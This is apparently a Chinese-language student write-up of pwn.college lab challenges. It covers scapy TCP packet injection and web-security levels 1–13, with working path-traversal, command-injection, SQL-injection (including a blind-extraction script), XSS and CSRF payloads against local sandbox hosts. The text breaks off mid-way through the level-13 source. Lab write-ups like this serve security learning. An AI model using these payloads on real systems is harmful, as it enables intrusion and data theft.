                'ack': tcp.seq + 29
            })

            raw_pkt = Raw(load='FLAG\n')
            (Ether(src=packet_data['src'], dst=packet_data['dst']) /
             IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) /
             TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) /
             raw_pkt).display()

            sendp(Ether(src=packet_data['src'], dst=packet_data['dst']) /
                  IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) /
                  TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) /
                  raw_pkt, iface=&quot;eth0&quot;)

sniff(filter=&quot;tcp&quot;, prn=CallBack, iface='eth0', count=100)


</code></pre>
<p>然后顺利拿到flag</p>
<pre><code>pwn.college{A3pb7kfH8On2sOV2_hSlPGWG_P8.dJzNzMDL2QjMyMzW}
</code></pre>
<p>可以看这个<a href="https://youtu.be/nD4IidymLds?list=PL-ymxv0nOtqqW1sDfN6UGUfJTcYqYH9CM&amp;t=194">视频讲解</a>
<img src="CSE365/image-6.png" alt="level14" /></p>
<p><strong>碎碎念：这个部分其实不太难，重点是学会scapy即可，但是诡异的地方在于必须使用tmux，好像这样才能在一个父线程之下，不然你在另一个shell里面使用python脚本，这个shell里面的tcpdump抓不到东西。这曾经困扰了我很久，别的就没啥了。</strong></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="knoeledge-1"><a class="header" href="#knoeledge-1">Knoeledge</a></h1>
<p>需要知道web服务器都能干什么事</p>
<p>SQL，大名鼎鼎的SQL注入</p>
<p>命令注入</p>
<p>HTML，也就是注入部分JavaScript</p>
<p>C语言的堆栈注入</p>
<p>总的来说就是利用Web服务器会执行一些语句（部分参数来自于我们的输入），来进行操作。</p>
<p>Origin的概念：(<code>&lt;shceme&gt;</code>,<code>&lt;host&gt;</code>,<code>&lt;post&gt;</code>)
（http, exapmle.com,80）</p>
<p>HTML-embeds、域名、站点等概念，基本上都是计算机网络的内容</p>
<h1 id="wp-1"><a class="header" href="#wp-1">WP</a></h1>
<h2 id="level1-exploit-a-path-traversal-vulnerability"><a class="header" href="#level1-exploit-a-path-traversal-vulnerability">level1 Exploit a path traversal vulnerability</a></h2>
<p>这个其实我找不到太好的方法，只能猜，猜到了就是了</p>
<pre><code>hacker@web-security-level-1:~$ curl http://challenge.localhost:80/?path=/flag
pwn.college{4MSrtxHJYUF2_wAz81iNV6UtM5K.ddDOzMDL2QjMyMzW}
hacker@web-security-level-1:~$
</code></pre>
<p>这个也不让安装dirsearch，不知道怎么自己扫目录，也许可以自己写脚本？</p>
<h2 id="level2-exploit-a-command-injection-vulnerability"><a class="header" href="#level2-exploit-a-command-injection-vulnerability">level2 Exploit a command injection vulnerability</a></h2>
<p>这个十分简单，就是一个简单的命令注入，只需要让前面的命令闭合即可</p>
<pre><code>hacker@web-security-level-2:~$ curl &quot;http://challenge.localhost:80/?timezone=;cat%20/flag;#&quot;
pwn.college{o0h_efJ2CAv60AmeSOoPYGrZKBs.dhDOzMDL2QjMyMzW}
Mon Jul 24 07:17:20 UTC 2023
</code></pre>
<h2 id="level3-exploit-an-authentication-bypass-vulnerability"><a class="header" href="#level3-exploit-an-authentication-bypass-vulnerability">level3 Exploit an authentication bypass vulnerability</a></h2>
<p><img src="CSE365/image-8.png" alt="界面" />
在运行以后出现这个界面</p>
<p>一开始以为是弱口令，试了好几个都不太星，然后看了一下源代码</p>
<pre><code>    db.execute((&quot;CREATE TABLE IF NOT EXISTS users AS &quot;
                'SELECT &quot;flag&quot; AS username, ? as password'),
               (flag,))

    if request.method == &quot;POST&quot;:
        username = request.form.get(&quot;username&quot;)
        password = request.form.get(&quot;password&quot;)
        assert username, &quot;Missing `username` form&quot;
        assert password, &quot;Missing `password` form&quot;

        user = db.execute(f&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;, (username, password)).fetchone()
        assert user, &quot;Invalid `username` or `password`&quot;

        return redirect(request.path, user=int(user[&quot;rowid&quot;]))

    if &quot;user&quot; in request.args:
        user_id = int(request.args[&quot;user&quot;])
        user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (user_id,)).fetchone()
        if user:
            username = user[&quot;username&quot;]
            if username == &quot;flag&quot;:
                return f&quot;{flag}\n&quot;
            return f&quot;Hello, {username}!\n&quot;

    return form([&quot;username&quot;, &quot;password&quot;])
</code></pre>
<p>发现重点在于rowid</p>
<pre><code>hacker@web-security-level-3:~$ curl -X GET &quot;http://challenge.localhost:80/?user=1&quot;
pwn.college{8_5yNK5tBFzbFE9oz5e05zoS6-a.dlDOzMDL2QjMyMzW}
</code></pre>
<p>这道题的重点就是找到绕过这个界面的方法。也就是说我们如果看到的是那个输入的页面，只有输入正确的flag才行，但是我们想要的就是flag，怎么可能输入进去？</p>
<p>因此正确的做法是只使用GET请求，构造合理的请求包。</p>
<p>当然为什么user=1，要看这个<a href="https://youtu.be/0qSzKxjlRQ0?list=PL-ymxv0nOtqqW1sDfN6UGUfJTcYqYH9CM&amp;t=2085">视频</a>，我其实是瞎猜的，但是应该是看一下返回包。</p>
<h2 id="level4-exploit-a-structured-query-language-injection-vulnerability-to-login"><a class="header" href="#level4-exploit-a-structured-query-language-injection-vulnerability-to-login">level4 Exploit a structured query language injection vulnerability to login</a></h2>
<p>还是看代码</p>
<pre><code>        user = db.execute(f'SELECT rowid, * FROM users WHERE username = &quot;{username}&quot; AND password = &quot;{password}&quot;').fetchone()
        assert user, &quot;Invalid `username` or `password`&quot;

        session[&quot;user&quot;] = int(user[&quot;rowid&quot;])
        return redirect(request.path)

    if session.get(&quot;user&quot;):
        user_id = int(session.get(&quot;user&quot;, -1))
        user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (user_id,)).fetchone()
        if user:
            username = user[&quot;username&quot;]
            if username == &quot;flag&quot;:
                return f&quot;{flag}\n&quot;
            return f&quot;Hello, {username}!\n&quot;
</code></pre>
<p>SQL注入</p>
<p>在user的地方填上<code>flag&quot;;--</code>即可</p>
<pre><code>pwn.college{YeVTtF9Vvh8mWYEuq-G30ezoOld.dBTOzMDL2QjMyMzW}
</code></pre>
<h2 id="level5-exploit-a-structured-query-language-injection-vulnerability-to-leak-data"><a class="header" href="#level5-exploit-a-structured-query-language-injection-vulnerability-to-leak-data">level5 Exploit a structured query language injection vulnerability to leak data</a></h2>
<pre><code>def level5():
    db.execute((&quot;CREATE TABLE IF NOT EXISTS users AS &quot;
                'SELECT &quot;flag&quot; AS username, ? AS password'),
               (flag,))

    query = request.args.get(&quot;query&quot;, &quot;%&quot;)
    users = db.execute(f'SELECT username FROM users WHERE username LIKE &quot;{query}&quot;').fetchall()
    return &quot;&quot;.join(f'{user[&quot;username&quot;]}\n' for user in users)
</code></pre>
<p>这个看代码的话，直接上联合查询</p>
<pre><code>hacker@web-security-level-5:~$ curl &quot;http://challenge.localhost:80/?query=%22%20UNION%20SELECT%20password%20FROM%20users%20--&quot;
pwn.college{ky74n-Ct2lQvah1GVjTktI5hfs6.dFTOzMDL2QjMyMzW}
</code></pre>
<p>其实还是简单的。</p>
<h2 id="level6-exploit-a-structured-query-language-injection-vulnerability-with-an-unknown-database-structure"><a class="header" href="#level6-exploit-a-structured-query-language-injection-vulnerability-with-an-unknown-database-structure">level6 Exploit a structured query language injection vulnerability with an unknown database structure</a></h2>
<pre><code>def level6():
    table_name = f&quot;table{hash(flag) &amp; 0xFFFFFFFFFFFFFFFF}&quot;
    db.execute((f&quot;CREATE TABLE IF NOT EXISTS {table_name} AS &quot;
                'SELECT &quot;flag&quot; AS username, ? AS password'),
               (flag,))

    query = request.args.get(&quot;query&quot;, &quot;%&quot;)
    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE &quot;{query}&quot;').fetchall()
    return &quot;&quot;.join(f'{user[&quot;username&quot;]}\n' for user in users)
</code></pre>
<p>这个是说我们不知道库名和表名，但是sqlite有如下语句可以查询</p>
<pre><code>--  this query will extract data from databases.

SELECT name FROM sqlite_master WHERE type = &quot;table&quot;

--  or

SELECT tbl_name FROM sqlite_master
</code></pre>
<p>这样我们就可以联合查询了，先查表名</p>
<pre><code>hacker@web-security-level-6:~$ curl 'http://challenge.localhost:80/?query=%22%20UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type%20%3D%20%22table%22%3B--'
table14306546637912208127
hacker@web-security-level-6:~$
</code></pre>
<p>然后从这个表读取flag即可</p>
<pre><code>hacker@web-security-level-6:~$ curl 'http://challenge.localhost:80/?query=%20%22%20UNION%20SELECT%20password%20FROM%20table14306546637912208127%20%3B%20--'
pwn.college{g044nYlCw5bx-l7OByeCKKr9QCs.dJTOzMDL2QjMyMzW}
hacker@web-security-level-6:~$
</code></pre>
<h2 id="level7-exploit-a-structured-query-language-injection-vulnerability-to-blindly-leak-data"><a class="header" href="#level7-exploit-a-structured-query-language-injection-vulnerability-to-blindly-leak-data">level7 Exploit a structured query language injection vulnerability to blindly leak data</a></h2>
<p>先看源代码</p>
<pre><code>def level7():
    db.execute((&quot;CREATE TABLE IF NOT EXISTS users AS &quot;
                'SELECT &quot;flag&quot; AS username, ? as password'),
               (flag,))

    if request.method == &quot;POST&quot;:
        username = request.form.get(&quot;username&quot;)
        password = request.form.get(&quot;password&quot;)
        assert username, &quot;Missing `username` form&quot;
        assert password, &quot;Missing `password` form&quot;

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = &quot;{username}&quot; AND password = &quot;{password}&quot;').fetchone()
        assert user, &quot;Invalid `username` or `password`&quot;

        session[&quot;user&quot;] = int(user[&quot;rowid&quot;])
        return redirect(request.path)

    if session.get(&quot;user&quot;):
        user_id = int(session.get(&quot;user&quot;, -1))
        user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (user_id,)).fetchone()
        if user:
            username = user[&quot;username&quot;]
            return f&quot;Hello, {username}!\n&quot;

    return form([&quot;username&quot;, &quot;password&quot;])
</code></pre>
<p>根据源代码，如果我们输入正确，我们就可以得到<code>hellp,flag</code>的提示，也就是说，我们可以一位一位的来实验，进而推出整个flag。这是典型的盲注。</p>
<p>当然，这里有一个问题就是<code>LIKE</code>是不区分大小写的，因此我们需要使用<code>GLOB</code>来替换</p>
<p>然后我们写个脚本即可</p>
<pre><code>import string
import requests

searchspace = string.ascii_letters + string.digits + '{}._-'
solution = ''

while True:
    for char in searchspace:
        data = {
            &quot;username&quot;: f'&quot; OR password  GLOB &quot;{solution}{char}*&quot; -- -',
            &quot;password&quot;: 'flag'
        }

        response = requests.post(&quot;http://challenge.localhost/&quot;, data = data)
        if response.text.startswith(&quot;Hello&quot;):
            solution += char
            break
    if solution[-1] == &quot;}&quot;:
        print(solution)
        break
</code></pre>
<p>然后得到flag</p>
<pre><code>hacker@web-security-level-7:~$ python test.py
pwn.college{IqvCxcvkbplIDWtJG3DclxxKfPE.dNTOzMDL2QjMyMzW}
hacker@web-security-level-7:~$
</code></pre>
<h2 id="level8-exploit-a-cross-site-scripting-vulnerability"><a class="header" href="#level8-exploit-a-cross-site-scripting-vulnerability">level8 Exploit a cross site scripting vulnerability</a></h2>
<p>终于来到了激动人心的跨站脚本，还是先看源码</p>
<pre><code>def level8():
    if request.path == &quot;/echo&quot;:
        echo = request.args.get(&quot;echo&quot;)
        assert echo, &quot;Missing `echo` argument&quot;
        return html(echo)

    if request.path == &quot;/visit&quot;:
        url = request.args.get(&quot;url&quot;)
        assert url, &quot;Missing `url` argument&quot;

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f&quot;Invalid `url`, hostname should be `{challenge_host}`&quot;

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return &quot;Failed to alert\n&quot;
            else:
                return f&quot;{flag}\n&quot;

    return &quot;Not Found\n&quot;, 404
</code></pre>
<p>如果将 url 参数设置为 javascript:alert(1)，那么它将弹出一个警报框，并返回标志值 flag。</p>
<pre><code>hacker@web-security-level-8:~$ curl &quot;http://challenge.localhost/visit?url=&lt;script&gt;alert(1)&lt;/script&gt;&quot;
Invalid `url`, hostname should be `challenge.localhost`
hacker@web-security-level-8:~$ curl &quot;http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=&lt;script&gt;alert(1)&lt;/script&gt;&quot;
pwn.college{4g4Hj421ueC3NuXZRLIM6QQnz_i.dRTOzMDL2QjMyMzW}
hacker@web-security-level-8:~$
</code></pre>
<h2 id="level9-exploit-a-cross-site-scripting-vulnerability-with-more-complicated-context"><a class="header" href="#level9-exploit-a-cross-site-scripting-vulnerability-with-more-complicated-context">level9 Exploit a cross site scripting vulnerability with more complicated context</a></h2>
<p>还是先看一下源代码</p>
<pre><code>def level9():
    if request.path == &quot;/echo&quot;:
        echo = request.args.get(&quot;echo&quot;)
        assert echo, &quot;Missing `echo` argument&quot;
        return html(f&quot;&lt;textarea&gt;{echo}&lt;/textarea&gt;&quot;)

    if request.path == &quot;/visit&quot;:
        url = request.args.get(&quot;url&quot;)
        assert url, &quot;Missing `url` argument&quot;

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f&quot;Invalid `url`, hostname should be `{challenge_host}`&quot;

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return &quot;Failed to alert\n&quot;
            else:
                return f&quot;{flag}\n&quot;

    return &quot;Not Found\n&quot;, 404
</code></pre>
<p>差不多，不同的是要使用<code>&lt;textarea&gt;</code>标签</p>
<pre><code>hacker@web-security-level-9:~$ curl &quot;http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;&quot;
pwn.college{Ukha1cPrsQUTyJ0IakNuWL6dt7w.dVTOzMDL2QjMyMzW}
hacker@web-security-level-9:~$
</code></pre>
<h2 id="level10-exploit-a-cross-site-scripting-vulnerability-to-cause-a-user-action"><a class="header" href="#level10-exploit-a-cross-site-scripting-vulnerability-to-cause-a-user-action">level10 Exploit a cross site scripting vulnerability to cause a user action</a></h2>
<p>源代码</p>
<pre><code>def level10():
    db.execute((&quot;CREATE TABLE IF NOT EXISTS users AS &quot;
                'SELECT &quot;flag&quot; AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == &quot;/login&quot;:
        if request.method == &quot;POST&quot;:
            username = request.form.get(&quot;username&quot;)
            password = request.form.get(&quot;password&quot;)
            assert username, &quot;Missing `username` form&quot;
            assert password, &quot;Missing `password` form&quot;

            user = db.execute(f&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;, (username, password)).fetchone()
            assert user, &quot;Invalid `username` or `password`&quot;

            session[&quot;user&quot;] = int(user[&quot;rowid&quot;])
            return redirect(request.path)

        return form([&quot;username&quot;, &quot;password&quot;])

    if request.path == &quot;/leak&quot;:
        user_id = int(session.get(&quot;user&quot;, -1))
        user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (user_id,)).fetchone()
        assert user, &quot;Not logged in&quot;
        db.execute(f&quot;UPDATE users SET leak = TRUE WHERE rowid = ?&quot;, (user_id,))
        return &quot;Leaked\n&quot;

    if request.path == &quot;/info&quot;:
        assert &quot;user&quot; in request.args, &quot;Missing `user` argument&quot;
        user_id = int(request.args[&quot;user&quot;])
        user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (user_id,)).fetchone()
        assert user, &quot;Invalid `user`&quot;
        info = [user[&quot;username&quot;]]
        if user[&quot;leak&quot;]:
            info.append(user[&quot;password&quot;])
        return &quot; &quot;.join(info) + &quot;\n&quot;

    if request.path == &quot;/visit&quot;:
        url = request.args.get(&quot;url&quot;)
        assert url, &quot;Missing `url` argument&quot;

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f&quot;Invalid `url`, hostname should be `{challenge_host}`&quot;

        with run_browser() as browser:
            browser.get(f&quot;http://{challenge_host}/login&quot;)

            user_form = {
                &quot;username&quot;: &quot;flag&quot;,
                &quot;password&quot;: flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, &quot;submit&quot;)
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return &quot;Visited\n&quot;

    if request.path == &quot;/echo&quot;:
        echo = request.args.get(&quot;echo&quot;)
        assert echo, &quot;Missing `echo` argument&quot;
        return html(echo)

    return &quot;Not Found\n&quot;, 404
</code></pre>
<p>五个路由：</p>
<ul>
<li><code>/login</code> 路由：它接受 POST 请求，从表单中获取 username 和 password 参数的值，并使用 SQLite 数据库查询验证用户身份。如果验证成功，它将在会话中存储用户 ID，并重定向到登录页面。如果请求方法是 GET，它将返回一个包含 username 和 password 输入框的 HTML 表单。</li>
<li><code>/leak</code> 路由：它检查当前用户是否已经登录，并将该用户的 leak 标志设置为 TRUE。这个标志可以用来控制是否泄露用户密码。</li>
<li><code>/info</code> 路由：它从请求参数中获取 user 参数的值，并使用 SQLite 数据库查询该用户的信息。如果该用户存在，它将返回该用户的用户名和密码（如果 leak 标志为 TRUE）。</li>
<li><code>/visit</code> 路由：它从请求参数中获取 url 参数的值，并使用 Selenium WebDriver 打开该 URL。在访问该 URL 之前，它会先登录为管理员用户，以便访问敏感数据。如果 url 参数的主机名与 challenge_host 变量的值相同，它将访问该 URL 并返回一个成功消息。</li>
<li><code>/echo</code> 路由：它从请求参数中获取 echo 参数的值，并返回一个 HTML 响应，其中包含 echo 参数的值。</li>
</ul>
<pre><code>hacker@web-security-level-10:~$ curl http://challenge.localhost/visit?url=http://challenge.localhost/leak
Visited
hacker@web-security-level-10:~$
</code></pre>
<p>这时候我们就已经被设置为True了，然后再访问即可</p>
<pre><code>hacker@web-security-level-10:~$ curl http://challenge.localhost/info?user=1
flag pwn.college{4QUT7p7kVB1-GCQIE-psBqLVG8L.dZTOzMDL2QjMyMzW}
hacker@web-security-level-10:~$
</code></pre>
<h2 id="level11-exploit-a-cross-site-request-forgery-vulnerability"><a class="header" href="#level11-exploit-a-cross-site-request-forgery-vulnerability">level11 Exploit a cross site request forgery vulnerability</a></h2>
<p>看一下源代码</p>
<pre><code>def level11():
    db.execute((&quot;CREATE TABLE IF NOT EXISTS users AS &quot;
                'SELECT &quot;flag&quot; AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == &quot;/login&quot;:
        if request.method == &quot;POST&quot;:
            username = request.form.get(&quot;username&quot;)
            password = request.form.get(&quot;password&quot;)
            assert username, &quot;Missing `username` form&quot;
            assert password, &quot;Missing `password` form&quot;

            user = db.execute(f&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;, (username, password)).fetchone()
            assert user, &quot;Invalid `username` or `password`&quot;

            session[&quot;user&quot;] = int(user[&quot;rowid&quot;])
            return redirect(request.path)

        return form([&quot;username&quot;, &quot;password&quot;])

    if request.path == &quot;/leak&quot;:
        user_id = int(session.get(&quot;user&quot;, -1))
        user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (user_id,)).fetchone()
        assert user, &quot;Not logged in&quot;
        db.execute(f&quot;UPDATE users SET leak = TRUE WHERE rowid = ?&quot;, (user_id,))
        return &quot;Leaked\n&quot;

    if request.path == &quot;/info&quot;:
        assert &quot;user&quot; in request.args, &quot;Missing `user` argument&quot;
        user_id = int(request.args[&quot;user&quot;])
        user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (user_id,)).fetchone()
        assert user, &quot;Invalid `user`&quot;
        info = [user[&quot;username&quot;]]
        if user[&quot;leak&quot;]:
            info.append(user[&quot;password&quot;])
        return &quot; &quot;.join(info) + &quot;\n&quot;

    if request.path == &quot;/visit&quot;:
        url = request.args.get(&quot;url&quot;)
        assert url, &quot;Missing `url` argument&quot;

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == hacker_host, f&quot;Invalid `url`, hostname should be `{hacker_host}`&quot;

        with run_browser() as browser:
            browser.get(f&quot;http://{challenge_host}/login&quot;)

            user_form = {
                &quot;username&quot;: &quot;flag&quot;,
                &quot;password&quot;: flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, &quot;submit&quot;)
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return &quot;Visited\n&quot;

    return &quot;Not Found\n&quot;, 404
</code></pre>
<p>区别在于这次我们需要自己启动一个服务，因为<code>hacker.localhost</code>没有服务，当然，答疑给出了一个<a href="https://youtu.be/UoO57evSrAI?list=PL-ymxv0nOtqqW1sDfN6UGUfJTcYqYH9CM&amp;t=3994">参考框架</a></p>
<pre><code class="language-python">from flask import Flask,request
app=Flask(__name__)
@app.route(&quot;/&quot;)
def index():
    data='&lt;img src=&quot;http://challenge.localhost/&quot;&gt;'
    return data
app.run(&quot;hacker.localhost&quot;,8080)
</code></pre>
<p>后面的挑战都可以利用这个代码框架，只需要改变的是Data那个部分。
这里的所谓的img src是什么？就是tab里面这个小图片
<img src="CSE365/image-10.png" alt="img src" />
<img src="CSE365/image-9.png" alt="举个例子" />
不只是那个img src，比如说这个图，除了本身的请求之外，还请求了一个js,其实只要你用了其他站的src，都会同时发包的。</p>
<p>正确的内容如下所示:</p>
<pre><code>from flask import Flask,request

app=Flask(__name__)
@app.route(&quot;/&quot;)
def index():
    data = '&lt;img src=&quot;http://challenge.localhost/leak&quot;&gt;'
    return data
app.run(&quot;hacker.localhost&quot;,8080)
</code></pre>
<p>这里是这样的：我启动了<code>hacker.localhost</code>服务，也就是127.0.0.1，然后我现在希望服务器把我设置为visited，这样我再访问challenge的时候就可以访问到flag了。这时候，我如何通过hacker让challenge给我设置为  visited呢？利用访问网页的同时网页也会请求ico的特点，让hacker发一个访问leak的包，即可！</p>
<pre><code>hacker@web-security-level-11:~$ curl 'http://challenge.localhost/visit?url=http://hacker.localhost:8080/'
Visited
hacker@web-security-level-11:~$ curl http://challenge.localhost/info?user=1
flag pwn.college{YJJku1sAPTQ8nbbxZ7Dy_Z3PahG.ddTOzMDL2QjMyMzW}
hacker@web-security-level-11:~$
</code></pre>
<h2 id="level12-exploit-a-cross-site-request-forgery-vulnerability-where-the-request-must-post"><a class="header" href="#level12-exploit-a-cross-site-request-forgery-vulnerability-where-the-request-must-post">level12 Exploit a cross site request forgery vulnerability where the request must POST</a></h2>
<p>看看源码</p>
<pre><code>def level12():
    db.execute((&quot;CREATE TABLE IF NOT EXISTS users AS &quot;
                'SELECT &quot;flag&quot; AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == &quot;/login&quot;:
        if request.method == &quot;POST&quot;:
            username = request.form.get(&quot;username&quot;)
            password = request.form.get(&quot;password&quot;)
            assert username, &quot;Missing `username` form&quot;
            assert password, &quot;Missing `password` form&quot;

            user = db.execute(f&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;, (username, password)).fetchone()
            assert user, &quot;Invalid `username` or `password`&quot;

            session[&quot;user&quot;] = int(user[&quot;rowid&quot;])
            return redirect(request.path)

        return form([&quot;username&quot;, &quot;password&quot;])

    if request.path == &quot;/leak&quot; and request.method == &quot;POST&quot;:
        user_id = int(session.get(&quot;user&quot;, -1))
        user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (user_id,)).fetchone()
        assert user, &quot;Not logged in&quot;
        db.execute(f&quot;UPDATE users SET leak = TRUE WHERE rowid = ?&quot;, (user_id,))
        return &quot;Leaked\n&quot;

    if request.path == &quot;/info&quot;:
        assert &quot;user&quot; in request.args, &quot;Missing `user` argument&quot;
        user_id = int(request.args[&quot;user&quot;])
        user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (user_id,)).fetchone()
        assert user, &quot;Invalid `user`&quot;
        info = [user[&quot;username&quot;]]
        if user[&quot;leak&quot;]:
            info.append(user[&quot;password&quot;])
        return &quot; &quot;.join(info) + &quot;\n&quot;

    if request.path == &quot;/visit&quot;:
        url = request.args.get(&quot;url&quot;)
        assert url, &quot;Missing `url` argument&quot;

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == hacker_host, f&quot;Invalid `url`, hostname should be `{hacker_host}`&quot;

        with run_browser() as browser:
            browser.get(f&quot;http://{challenge_host}/login&quot;)

            user_form = {
                &quot;username&quot;: &quot;flag&quot;,
                &quot;password&quot;: flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, &quot;submit&quot;)
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return &quot;Visited\n&quot;

    return &quot;Not Found\n&quot;, 404
</code></pre>
<p>这个要求方法为POST，实在是不知道咋整，主要是前端那块儿会的太少了，看了一下 <code>discord</code>里面的解答，得到如下语句</p>
<pre><code>from flask import Flask,request

app=Flask(__name__)
@app.route(&quot;/&quot;)
def index():
    data = '&lt;script&gt;var xhr=new XMLHttpRequest(); xhr.open(&quot;POST&quot;,&quot;http://challenge.localhost/leak&quot;,true);xhr.withCredentials=true;xhr.send(null);&lt;/script&gt;'
    return data
app.run(&quot;hacker.localhost&quot;,8080)
</code></pre>
<p><em>有点儿超纲了朋友。。。</em></p>
<blockquote>
<p>解释是这样的：这段代码似乎是在 hacker.localhost:8080 上启动了一个 Flask 应用程序，它的主页返回了一个包含一个 JavaScript 代码块的 HTML 页面。该 JavaScript 代码块使用 XMLHttpRequest 对象向 challenge.localhost 的 /leak 路由发送了一个 POST 请求，并将 withCredentials 属性设置为 true，以便在跨域请求中发送身份验证信息。</p>
</blockquote>
<blockquote>
<p>这个 JavaScript 代码块可能会导致一些安全问题，例如：</p>
</blockquote>
<blockquote>
<p>它允许跨域请求，而没有对目标服务器进行足够的验证和授权。这可能导致攻击者利用该漏洞，向目标服务器发送恶意请求，例如修改数据、泄漏敏感信息等等。
以上是chatgpt的一些解答，反正我大受震撼</p>
</blockquote>
<pre><code>hacker@web-security-level-12:~$ curl 'http://challenge.localhost/visit?url=http://hacker.localhost:8080/'
Visited
hacker@web-security-level-12:~$ curl http://challenge.localhost/info?user=1
flag pwn.college{YOI6WPf6E5oX7qRb5fmdXaYAu3v.dhTOzMDL2QjMyMzW}
hacker@web-security-level-12:~$
</code></pre>
<p>得到答案。</p>
<p>这里最好看一下两个服务器的log，理解更深刻一些</p>
<pre><code>hacker@web-security-level-12:~$ sh file.sh
 * Serving Flask app 'run'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://challenge.localhost:80
Press CTRL+C to quit
127.0.0.1 - - [05/Aug/2023 13:38:17] &quot;GET /login HTTP/1.1&quot; 200 -
127.0.0.1 - - [05/Aug/2023 13:38:17] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -
127.0.0.1 - - [05/Aug/2023 13:38:17] &quot;POST /login HTTP/1.1&quot; 302 -
127.0.0.1 - - [05/Aug/2023 13:38:17] &quot;GET /login HTTP/1.1&quot; 200 -
127.0.0.1 - - [05/Aug/2023 13:38:18] &quot;POST /leak HTTP/1.1&quot; 200 -
127.0.0.1 - - [05/Aug/2023 13:38:22] &quot;GET /visit?url=http://hacker.localhost:8080/ HTTP/1.1&quot; 200 -
127.0.0.1 - - [05/Aug/2023 13:38:26] &quot;GET /info?user=1 HTTP/1.1&quot; 200 -
</code></pre>
<p>正好有时间戳，可以看一下发生了什么</p>
<pre><code>hacker@web-security-level-12:~$ python test.py
 * Serving Flask app 'test'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://hacker.localhost:8080
Press CTRL+C to quit
127.0.0.1 - - [05/Aug/2023 13:38:18] &quot;GET / HTTP/1.1&quot; 200 -
127.0.0.1 - - [05/Aug/2023 13:38:18] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -
</code></pre>
<h2 id="level13-exploit-a-cross-site-scripting-vulnerability-to-exfilitrate-user-session-data"><a class="header" href="#level13-exploit-a-cross-site-scripting-vulnerability-to-exfilitrate-user-session-data">level13 Exploit a cross site scripting vulnerability to exfilitrate user session data</a></h2>
<p>看一下源代码，</p>
<pre><code>def level13():
    app.config['SESSION_COOKIE_HTTPONLY'] = False

    db.execute((&quot;CREATE TABLE IF NOT EXISTS users AS &quot;
                'SELECT &quot;flag&quot; AS username, ? as password'),
               (flag,))

    if request.path == &quot;/login&quot;:
        if request.method == &quot;POST&quot;:
            username = request.form.get(&quot;username&quot;)
            password = request.form.get(&quot;password&quot;)
            assert username, &quot;Missing `username` form&quot;
            assert password, &quot;Missing `password` form&quot;

            user = db.execute(f&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;, (username, password)).fetchone()
            assert user, &quot;Invalid `username` or `password`&quot;

            session[&quot;user&quot;] = int(user[&quot;rowid&quot;])
            return redirect(request.path)

        return form([&quot;username&quot;, &quot;password&quot;])

    if request.path == &quot;/info&quot;:
        session_user_id = int(session.get(&quot;user&quot;, -1))
        session_user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (session_user_id,)).fetchone()

        request_user_id = int(request.args.get(&quot;user&quot;, session_user_id))
        request_user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (request_user_id,)).fetchone()
        assert request_user, &quot;Invalid `user`&quot;

        info = [request_user[&quot;username&quot;]]
